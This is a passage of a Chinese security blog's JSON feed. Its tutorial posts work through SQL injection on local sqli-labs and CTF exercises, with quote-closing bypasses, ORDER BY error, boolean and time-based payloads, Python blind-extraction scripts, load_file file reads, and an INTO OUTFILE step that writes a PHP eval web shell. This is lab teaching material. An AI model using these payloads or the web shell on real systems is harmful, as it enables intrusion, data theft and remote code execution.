($row[&#x27;passwd&#x27;]===$passwd)&#123;$_SESSION[&#x27;flag&#x27;] = 1;</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式-4\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式-4\">#</a> 绕过方式</h3>\n<p>也就是说，<strong>uname 是用单引号包裹</strong>，所以我们可以用<strong>单引号去闭合</strong> ——</p>\n<p>使用 <code>' = 1 = '</code>  绕过：因为 <code>uname='' = 1 </code> 为假， <code>假 = ''</code>  为真</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#原理核心，和 &#x27; or 1 or &#x27; 异曲同工</span><br><span class=\"line\">uname=&#x27;= (1) =&#x27;&amp;passwd=admin</span><br><span class=\"line\"></span><br><span class=\"line\">#那么就可以有如下注入点：</span><br><span class=\"line\">uname=&#x27;= (select(1)from(admin)where(length(passwd)=32)) =&#x27;&amp;passwd=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002221112034.png\" alt=\"image-20221002221112034\"></p>\n<p>确定了长度，尝试考虑使用脚本爆破</p>\n<p>关键核心语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=  &#x27;= (select(1)from(admin)where(substr((passwd)from(32))=&#x27;f&#x27;)) =&#x27;</span><br><span class=\"line\">#其中，32需要遍历，&#x27;f&#x27;也需要遍历</span><br><span class=\"line\">#注意，由于使用了substr + from的方式，因此需要&quot;从后向前&quot;盲推字符</span><br></pre></td></tr></table></figure>\n<p>附上脚本：</p>\n<p><code>注意</code> ：post 请求中，如果参数是 &quot;uname=xxxx &amp; passwd=yyyy&quot; 这样的，我们需要在 python 脚本中建立一个字典去匹配。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&#x27;password error!!@_@&#x27;</span></span><br><span class=\"line\">words = <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-9/login.php&quot;</span></span><br><span class=\"line\">payload = &#123;<span class=\"string\">&quot;uname&quot;</span>: <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;passwd&quot;</span>:<span class=\"string\">&quot;&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_flag</span>():</span><br><span class=\"line\">\tflag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\ttemp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">33</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">            <span class=\"comment\">#flag:c12366feb7373bf6d869ab7d581215cf</span></span><br><span class=\"line\">\t\t\ttemp = temp[::-<span class=\"number\">1</span>] <span class=\"comment\">#first reverse cf-&gt;fc</span></span><br><span class=\"line\">\t\t\ttemp = temp + j   <span class=\"comment\">#fcg</span></span><br><span class=\"line\">\t\t\ttemp = temp[::-<span class=\"number\">1</span>] <span class=\"comment\">#second reverse gcf</span></span><br><span class=\"line\">\t\t\tpayload[<span class=\"string\">&#x27;uname&#x27;</span>] = <span class=\"string\">&quot;&#x27;= (select(1)from(admin)where(substr((passwd)from(&#123;&#125;))=&#x27;&#123;&#125;&#x27;)) =&#x27;&quot;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">33</span>-i),temp)</span><br><span class=\"line\">\t\t\tpayload[<span class=\"string\">&#x27;passwd&#x27;</span>] = <span class=\"string\">&quot;admin&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">#print(payload)</span></span><br><span class=\"line\">\t\t\tresponse = requests.post(url, data = payload)</span><br><span class=\"line\">\t\t\t<span class=\"comment\">#print(response.text)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> key <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">\t\t\t\tflag = temp</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;++++&quot;</span>,flag)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">#if not found</span></span><br><span class=\"line\">\t\t\ttemp = flag</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;the flag is:&quot;</span>,flag)</span><br><span class=\"line\"></span><br><span class=\"line\">target_flag()</span><br></pre></td></tr></table></figure>\n<p>格式为 <code>小写</code>  + <code>数字</code> ，属于 <code>md5</code>  加密格式</p>\n<p><a href=\"http://xn--www-x98dz94d51o6v2e.cmd5.com\">那么就有 www.cmd5.com</a></p>\n<p><img src=\"image-20221002231016796.png\" alt=\"image-20221002231016796\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/",
            "title": "OrderBy注入",
            "date_published": "2022-10-02T04:59:34.000Z",
            "content_html": "<h1 id=\"有趣的order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#有趣的order-by注入\">#</a> 有趣的 Order by 注入</h1>\n<p>下面介绍几个从 ThreeZh1 师傅那里学到的几个有趣的 SQL 注入</p>\n<h2 id=\"常规order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#常规order-by注入\">#</a> 常规 Order by 注入</h2>\n<p>先来看一下 Order by 注入的原理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT username, password FROM users order by 1 asc;</span><br></pre></td></tr></table></figure>\n<p>这是一个常见的 order by 使用语句，order by 后面的数字 1 是第 1 个列的意思 (<strong>也可以指定列名</strong>)， <code>asc </code> /  <code>desc</code>  指定是升序还是降序。</p>\n<p><code>注意</code> ：在 order by 后面的不会根据计算的结果来排序。</p>\n<p>这里有以下几种方式来进行测试：</p>\n<h3 id=\"order-by-报错注入\"><a class=\"markdownIt-Anchor\" href=\"#order-by-报错注入\">#</a> order by + 报错注入</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by extractvalue(1,concat(0x7e, @@version,0x7e)) 进行报错注入</span><br></pre></td></tr></table></figure>\n<h3 id=\"order-by-布尔盲注\"><a class=\"markdownIt-Anchor\" href=\"#order-by-布尔盲注\">#</a> order by  + 布尔盲注</h3>\n<p>rand () 会返回一个 0 和 1 之间的随机数，如果括号内参数被赋值，同一个参数会返回同一个数。</p>\n<p>这里就可以用 mid（也就是 substr 函数）来构造布尔盲注的方式来进行注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by rand(mid(version(),1,1)=5)</span><br></pre></td></tr></table></figure>\n<h3 id=\"order-by-0的数-and时间盲注方式\"><a class=\"markdownIt-Anchor\" href=\"#order-by-0的数-and时间盲注方式\">#</a> order by + (&gt;0 的数) +and + 时间盲注方式</h3>\n<p>在 order by 后面的不会根据计算的结果来排序，但是计算还是会运行。</p>\n<p>也就是，当我们的 payload 有延迟命令的时候，页面还是会延迟的。</p>\n<p>使用 and 连接时间盲注 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by 1 and (if(substr(version(),1,1)=5,0,sleep(5)))</span><br></pre></td></tr></table></figure>\n<p>这里用 <code>sqllib-Less46</code>  作为一个学习的例子：</p>\n<p>它的源代码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$id=$_GET[&#x27;sort&#x27;];</span><br><span class=\"line\">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115154304.png\" alt=\"image-20221002115154304\"></p>\n<p>那么可以 <code>将这个1替换成查询语句</code> ，因为 <code>查询成功</code> 的结果就是 <code>返回1</code></p>\n<p><code>注意</code> ：如果对上述这一句有疑问，请看下图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = (select 2)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120406540.png\" alt=\"image-20221002120406540\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = 1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120420706.png\" alt=\"image-20221002120420706\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = 2</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120434503.png\" alt=\"image-20221002120434503\"></p>\n<p>OK，那就可以有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,version(),0x7e)))</span><br><span class=\"line\"></span><br><span class=\"line\">#与下面一句等效</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,version(),0x7e)))</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115341706.png\" alt=\"image-20221002115341706\"></p>\n<p>读表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,(select group_concat(table_name)) from information_schema.tables where table_schema=database(),0x7e)))</span><br><span class=\"line\"></span><br><span class=\"line\">#与下面一句等效</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115558719.png\" alt=\"image-20221002115558719\"></p>\n<h2 id=\"另外一种order-by-注入\"><a class=\"markdownIt-Anchor\" href=\"#另外一种order-by-注入\">#</a> 另外一种 Order by 注入</h2>\n<p>ThreeZh1 自己写了一个题来学习这一种 order by 注入。</p>\n<p>题目过滤了 F1g3 这个字段名。 <code>在id=3时</code> ，F1g3 字段存在 flag 的 base16 编码。(直接过滤 Flag 会更好)</p>\n<p>查询语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;.$id.&quot;;&quot;;</span><br></pre></td></tr></table></figure>\n<p>已知：数据库名：user，表名：this_1s_th3_fiag_tab13，字段名：F1ag，列号为 2</p>\n<p>因为过滤了 F1ag 这个字段名，我们不能直接用普通盲注的方式得到 F1ag，所以就得使用一种特别的 order by 盲注。</p>\n<p><img src=\"image-20221002120830210.png\" alt=\"image-20221002120830210\"></p>\n<h3 id=\"尝试报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试报错\">#</a> 尝试报错</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p>这个就是错误页面，意味着报错，那么大概率就是不带单引号的整型注入</p>\n<p><img src=\"image-20221002120931642.png\" alt=\"image-20221002120931642\"></p>\n<h3 id=\"尝试不报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试不报错\">#</a> 尝试不报错</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 #</span><br><span class=\"line\">不报错</span><br></pre></td></tr></table></figure>\n<h3 id=\"尝试获取列数\"><a class=\"markdownIt-Anchor\" href=\"#尝试获取列数\">#</a> 尝试获取列数</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by 3 #</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by 4 #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>获取列数为 3</p>\n<h3 id=\"尝试获取数据库版本\"><a class=\"markdownIt-Anchor\" href=\"#尝试获取数据库版本\">#</a> 尝试获取数据库版本</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 #</span><br><span class=\"line\">id: 1 name: oops,This is not the flag id </span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,version() #</span><br><span class=\"line\">???报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>既然，直接报错注入的方式不可行，那么我们换一种思路，用 order by</p>\n<p>可以直接用 order by 么？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 order by extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>服，那就尝试先来排序。由于 id=1、id=2 时，都不是 flag 所对应的 id，根据题目，我们知道 flag 在 id=3 所在行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">id=3 union select 1,2,3 order by 1</span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\"></span><br><span class=\"line\">id=3 union select 4,2,3 order by 1</span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\">id: 4 name: 3 </span><br></pre></td></tr></table></figure>\n<p>根据这个差异，我们可以指定 <code>按第二列</code> 来排序，并在 select 里猜测 flag 的首字符值。这样就可以不使用 F1ag 这个字段名就把值读出来。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=3 union select 1,&#x27;6&#x27;,3 order by 2</span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=3 union select 1,&#x27;7&#x27;,3 order by 2</span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\">id: 1 name: 3 </span><br></pre></td></tr></table></figure>\n<p>出现差别了，因为这里是首字符不等于’7’才会出现排序不一样，所以 flag 的第一个字符为’6’。</p>\n<p>按照这个思路，写出脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">key = <span class=\"string\">&quot;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: threezh1 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; id: 1 &lt;/td&gt; &lt;td&gt; name: 3 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&quot;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/threezh1/index.php?&quot;</span></span><br><span class=\"line\">words = <span class=\"string\">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_flag</span>():</span><br><span class=\"line\">\tlength = <span class=\"number\">0</span></span><br><span class=\"line\">\tflag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;id=3 union select 1,&#x27;&#123;0&#125;&#x27;,3 order by 2&quot;</span>.<span class=\"built_in\">format</span>(flag + j)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">\t\t\tcontent = requests.get(url + payload)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> key <span class=\"keyword\">in</span> content.text:</span><br><span class=\"line\">\t\t\t\tflag = flag + temp <span class=\"comment\">#使用上一次保存的字符添加到flag的尾部</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(flag)</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\ttemp = j <span class=\"comment\">#保存这一次的&quot;没有令回包出现变化&quot;的字符（temp保证是最新的字符）</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> j == <span class=\"string\">&#x27;Z&#x27;</span>:</span><br><span class=\"line\">\t\t\tlength = i-<span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;flag is:&quot;</span>,flag,<span class=\"string\">&quot;length is:&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\"></span><br><span class=\"line\">target_flag()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002124705182.png\" alt=\"image-20221002124705182\"></p>\n<p>附上源码查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&#x27;6&#x27;,3 order by 2</span><br></pre></td></tr></table></figure>\n<p>1-6 都是这个样子</p>\n<p><img src=\"image-20221002125810127.png\" alt=\"image-20221002125810127\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&#x27;7&#x27;,3 order by 2</span><br></pre></td></tr></table></figure>\n<p>到 7 的时候第一次变化</p>\n<p><img src=\"image-20221002125748813.png\" alt=\"image-20221002125748813\"></p>\n<p>所以就是要记录何时第一次变化，然后把 <code>上一次没有引起回包变化的字符</code> 添加到<strong> flag 的尾部</strong></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/",
            "title": "SQL注入读写文件",
            "date_published": "2022-10-01T16:29:51.000Z",
            "content_html": "<h1 id=\"sql注入之sql注入读写文件\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之sql注入读写文件\">#</a> SQL 注入之 SQL 注入读写文件</h1>\n<p>本篇讲解 SQL 注入读写文件</p>\n<p>使用到的函数如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</span><br><span class=\"line\">使用条件：</span><br><span class=\"line\">A、必须有权限读取并且文件必须完全可读</span><br><span class=\"line\">B、欲读取文件必须在服务器上</span><br><span class=\"line\">C、必须指定文件完整的路径</span><br><span class=\"line\">D、欲读取文件必须小于 max_allowed_packet</span><br></pre></td></tr></table></figure>\n<p>Less-1 为例</p>\n<h2 id=\"尝试报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试报错\">#</a> 尝试报错</h2>\n<p>添加一个单引号：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005100344.png\" alt=\"image-20221002005100344\"></p>\n<h2 id=\"尝试不报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试不报错\">#</a> 尝试不报错</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005148813.png\" alt=\"image-20221002005148813\"></p>\n<h2 id=\"尝试order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#尝试order-by注入\">#</a> 尝试 order by 注入</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; order by 3 %23</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; order by 4 %23</span><br><span class=\"line\">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<h2 id=\"读取文件\"><a class=\"markdownIt-Anchor\" href=\"#读取文件\">#</a> 读取文件</h2>\n<p>一般获取服务器的绝对路径有两种方法：</p>\n<ul>\n<li>通过经验猜测和自己搭建的服务器同样的路径</li>\n<li>通过爆破手段得到</li>\n</ul>\n<p>这里就演示一下本地服务器绝对路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=-11&#x27; union select 1, 2, load_file(&quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-1\\\\index.php&quot;) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005701120.png\" alt=\"image-20221002005701120\"></p>\n<p>显示比较混乱，原因是当读取到 index.php 之后返回给页面的是 php 语句，所以在页面显示的时候被 php 重复解析。</p>\n<p>我们转换 Hex 存储</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=-11&#x27; union select 1, 2, Hex(load_file(&quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-1\\\\index.php&quot;)) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005946274.png\" alt=\"image-20221002005946274\"></p>\n<p>接下来去 BurpSuit，或者在线网站转码。这里选择<strong> BurpSuit</strong>，选择 <code>Decoder-Decode as.....-Ascii hex</code></p>\n<p><img src=\"image-20221002010101190.png\" alt=\"image-20221002010101190\"></p>\n<h2 id=\"写入文件\"><a class=\"markdownIt-Anchor\" href=\"#写入文件\">#</a> 写入文件</h2>\n<p>写入文件使用函数为：into outfile</p>\n<p>例子为 Less-7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002010552632.png\" alt=\"image-20221002010552632\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;</span><br><span class=\"line\">报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27; %23</span><br><span class=\"line\">报错，如果仅是单引号注入则这里不应该报错。所以根据经验尝试加个括号</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;) %23</span><br><span class=\"line\">报错，一个小括号不够？那就再加一个</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) %23</span><br><span class=\"line\">成功不报错</span><br></pre></td></tr></table></figure>\n<p>那么，使用 order by 确定列数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) order by 3 %23</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) order by 4 %23</span><br><span class=\"line\">You have an error in your SQL syntax，报错，所以只有三列</span><br></pre></td></tr></table></figure>\n<p>使用 <code>into outflie</code>  语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) union select 1,2,3 into outfile &quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-7\\\\aaa.txt&quot; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002011103261.png\" alt=\"image-20221002011103261\"></p>\n<p>虽然报错，但是我们尝试去看一下 <code>Less-7/aaa.txt</code>  有没有生成</p>\n<p><img src=\"image-20221002011152149.png\" alt=\"image-20221002011152149\"></p>\n<p>写入成功。那么，既然可以写入文件，那就可以写入一句话木马。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) union select 1,2,&quot;&lt;?php @eval ($_POST[value]);?&gt;&quot; into outfile &quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-7\\\\aaa.php&quot; %23</span><br></pre></td></tr></table></figure>\n<p>并成功解析成 php 执行。</p>\n<p>至此，SQL 注入文件读写演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/",
            "title": "HTTP-Referer注入",
            "date_published": "2022-10-01T15:10:40.000Z",
            "content_html": "<h1 id=\"sql注入之http-referer注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之http-referer注入\">#</a> SQL 注入之 HTTP-Referer 注入</h1>\n<p>本篇讲解 HTTP-Referer 注入</p>\n<div class=\"note info\">\n<p>HTTP-Referer 注入</p>\n</div>\n<p>在前几章的博客中，满篇都是对于基于 select 的注入手段。</p>\n<p>其实，对于数据库而言，像 update、insert 等命令都有可爆出数据库信息的点的。</p>\n<p>OK，开始做 Less-19，送入<strong> Repeater</strong>。</p>\n<h2 id=\"尝试报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试报错\">#</a> 尝试报错</h2>\n<p>在 Referer 后添加一个单引号：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;</span><br></pre></td></tr></table></figure>\n<p>结果报错</p>\n<p><img src=\"image-20221001235013114.png\" alt=\"image-20221001235013114\"></p>\n<h2 id=\"尝试不报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试不报错\">#</a> 尝试不报错</h2>\n<p>我们尝试通过加 双引号 &quot;、 #号及其变形（#、%23、–+）来看看能否不报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot;</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; #</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot; %23</span><br><span class=\"line\">ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; %23&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; --+</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>后面还有个小括号，试试看是否需要闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot;) --+</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;) --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;)&quot; --+</span><br><span class=\"line\">ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 